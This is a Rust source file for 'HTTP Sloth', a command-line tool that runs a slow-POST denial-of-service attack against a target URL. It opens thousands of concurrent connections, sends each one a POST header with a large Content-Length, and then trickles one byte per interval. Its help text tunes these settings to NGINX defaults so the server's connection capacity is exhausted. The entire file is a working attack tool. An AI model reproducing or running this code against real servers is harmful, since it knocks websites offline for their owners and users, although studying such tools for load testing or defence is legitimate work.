use std::io;
use std::io::Write;
use std::net::ToSocketAddrs;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;

#[macro_use]
extern crate clap;
use clap::{App, Arg};

extern crate futures;
use futures::*;

extern crate tokio;
use tokio::net::TcpStream;

extern crate tokio_timer;
use tokio_timer::*;

extern crate tokio_rustls;

extern crate url;
use url::Url;

mod connector;

fn main() {
    let arguments = App::new("HTTP Sloth")
        .arg(Arg::with_name("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::with_name("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::with_name("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .arg(Arg::with_name("max-connections")
             .value_name("INTEGER")
             .long("max-connections")
             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
        .get_matches();

    let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
    let scheme = parsed_url.scheme().to_owned();
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
    let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
    let max_connections_count: usize =
        value_t!(arguments, "max-connections", usize).unwrap_or(8192);
    let spawn_interval = Duration::from_millis(10);

    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let addr = format!(
        "{}:{}",
        parsed_url.host_str().unwrap(),
        parsed_url.port_or_known_default().unwrap().to_string()
    )
    .to_socket_addrs()
    .unwrap()
    .next()
    .unwrap();

    let live_connections = Arc::new(AtomicUsize::new(0));
    let connection_number = AtomicUsize::new(0);

    let connector = connector::construct(&scheme, host);
    let cycle = Interval::new_interval(spawn_interval)
        .for_each({
            let live_connections = Arc::clone(&live_connections);
            move |_| {
                let connections_count = live_connections.load(Ordering::SeqCst);
                if connections_count >= max_connections_count {
                    return Ok(());
                };
                let connection_number = connection_number.fetch_add(1, Ordering::SeqCst) + 1;
                let start = start.clone();

                let socket = TcpStream::connect(&addr);

                let connection = connector(socket)
                    .and_then(move |mut socket| {
                        let _start_written = socket.write(start.as_bytes());
                        let _start_flushed = socket.flush();
                        println!("Stream number: {} spawned.", connection_number);
                        Ok(socket)
                    })
                    .and_then(move |mut socket| {
                        Interval::new_interval(interval)
                            .for_each(move |_| {
                                let _byte_written = socket.write(b"a");
                                let _byte_flushed = socket.flush();
                                println!("Stream number: {} written.", connection_number);
                                Ok(())
                            })
                            .map_err(|e| {
                                io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e))
                            })
                    });
                live_connections.fetch_add(1, Ordering::SeqCst);
                tokio::spawn(connection.map_err({
                    let live_connections = Arc::clone(&live_connections);
                    move |e| {
                        live_connections.fetch_sub(1, Ordering::SeqCst);
                        println!("Connection: {} failed! Reason: {}", connection_number, e);
                    }
                }));
                Ok(())
            }
        })
        .map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e));

    let live_stats = Interval::new_interval(Duration::from_secs(5))
        .for_each(move |_| {
            println!(
                "Live Connections: {}",
                live_connections.load(Ordering::SeqCst)
            );
            Ok(())
        })
        .map_err(move |e| println!("Cannot spawn live connetions print task. Reason: {}", e));

    tokio::run(futures::future::lazy(|| {
        tokio::spawn(cycle);
        tokio::spawn(live_stats);
        Ok(())
    }));
}
